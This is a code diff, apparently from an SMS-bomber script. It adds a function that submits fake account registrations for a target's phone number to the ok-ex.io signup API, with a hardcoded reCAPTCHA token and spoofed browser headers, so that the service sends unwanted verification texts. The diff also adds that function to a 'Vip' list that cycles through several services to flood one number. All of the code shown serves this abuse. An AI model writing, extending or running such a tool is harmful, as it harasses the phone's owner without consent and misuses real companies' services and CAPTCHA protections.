@@ -56,6 +56,52 @@ def check_internet():
 
 
 
+def ok_ex(phone):
+    import requests
+    
+    formatted_phone = "0" + phone.replace("+98", "")
+    url = "https://azapi.ok-ex.io/api/v1/users/register?lang=fa"
+    
+    payload = {
+        "email": formatted_phone,
+        "password": "12345678Mm",  # رمز عبور با حروف بزرگ و کوچک و عدد
+        "refer_code": "",
+        "g-recaptcha-response": "0cAFcWeA47rzKSjwLH_SX_1GIt6wSwH029S9Yx6Miw2qnA3UygqtqOyVhhQH_BWtE9nZLYZ_zwD9k3P5m6UU7ctssFMLrTkDu2hoG_myiotlfRGVjXT6TZ0AksEG5QBH7YuD_xF-WVLVT8KxK7es2qDfOrPRfcG7wHdENKXMbnyIADc0IU8CDRd2oO4FY9b7W9LZe1Lxax0WxwaMdZRWBcf7lePCU0RP07Y2DiyPiNj0xiujv-l0vl_b8DTO5AZ-0s_bQNitjOLmxXfZB1n2qKnmKlhzwWuDsJ6R3Zv6Ym2P5FMCsC43TgB_56sjr3dIF-HbJgPqKosI1WZ-kvoNa1Zpfh3GfSr5EV34b_uK-qbK-iD-negiF51_rLuH2C3cr6i9INGPxEg0bOTMLe7fi32RRHXxqvZiX3ZpfFim1Ab8qT_Pzb1roEoGpXV8VqGIMsQpyXyAgV04ylI6wz-RYTtvvVtYgxKaGnY9AQ74Bfzruc1wCLAxIekssn3Rq4yNSh2Df4liBTzHGGuOBoRzUu7seHL9dhsEdkkIQ6PH7Etofv4hnO24fF3WvO808mj6RIho2Ymjsm6QjnZRbpzCByptQnlinRDRZDSsExegTDB9rT5e5S1MkRCqwfYJOho7-xm3l1wHa0l_Rry8zuzPTNp5tcspC-YvcYaePRV67Gky2ovoahVSconDSDcYh32_QILxl8A5heifAeiU0S8UwXEBxY0OJ_4iHg7CYke8qptWqMBZLD23Tlb7tCNY-VCCz02WSALnyuTxmChll4geVAYQe-tWoHgmyTwg",
+        "type": "mobile"
+    }
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Authorization": "Bearer null",
+        "x-platform": "Web",
+        "x-os": "Mac",
+        "x-app-version": "6.4.59",
+        "x-os-version": "604.1",
+        "x-device-name": "safari",
+        "x-device-id": "0a33b6db-179d-4f41-86da-fc99f3150caa",
+        "Origin": "https://ok-ex.io",
+        "Referer": "https://ok-ex.io/",
+    }
+    
+    try:
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        print(f'{g}[+] Status: {response.status_code}{a}')
+        print(f'{g}[+] Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            print(f'{g}(ok_ex) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (ok_ex) HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] ok_ex Exception: {e}{a}')
+        return False
+
 
 def tapsi_food(phone):
     import requests
@@ -154,7 +200,8 @@ def send_service_safe(service, phone):
 def Vip(phone, Time):
     services = [
     banimode,
-    tapsi_food,  # اضافه کردن این خط
+    tapsi_food,
+    ok_ex,  # اضافه کردن این خط
 ]
     total_services = len(services)
 
